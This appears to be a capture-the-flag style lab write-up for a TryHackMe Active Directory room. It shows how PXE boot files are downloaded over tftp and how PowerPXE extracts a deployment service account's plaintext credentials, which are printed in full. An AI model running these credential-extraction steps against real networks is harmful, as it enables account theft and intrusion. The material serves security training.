
https://tryhackme.com/room/breachingad task 6

A new dhcp lease should contain PXE boot info. This will show where files will be downloaded from. Example:
![[Images/Pasted image 20250306191833.png]]

Let's download the file:
```sh
thm@THMJMP1 C:\Users\thm\Documents\sofia>tftp -i 10.200.80.202 GET "\Tmp\x64{B4E41F0D-B655-4EA8-8AC5-45274C840FB9}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
```

We can use tools like `PowerPXE.ps1`:
```sh
thm@THMJMP1 C:\Users\thm\Documents\sofia>powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm\Documents\sofia> Import-Module .\PowerPXE.ps1
```

We get the actual image path from this file:
```sh
PS C:\Users\thm\Documents\sofia> $BCDFile = "conf.bcd"
PS C:\Users\thm\Documents\sofia> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
\Boot\x64\Images\LiteTouchPE_x64.wim
```

Let's download the file:
```sh
PS C:\Users\thm\Documents\sofia> tftp -i 10.200.80.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
Transfer successful: 341899611 bytes in 183 second(s), 1868303 bytes/s
```

There also are tools to extract the username and password used for the installation from the file (we could also extract if and check `Bootstrap.ini`)
```sh
PS C:\Users\thm\Documents\sofia> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@
```

DeployRoot = \\THMMDT\MTDBuildLab$
UserID = svcMDT
UserDomain = ZA
UserPassword = PXEBootSecure1@

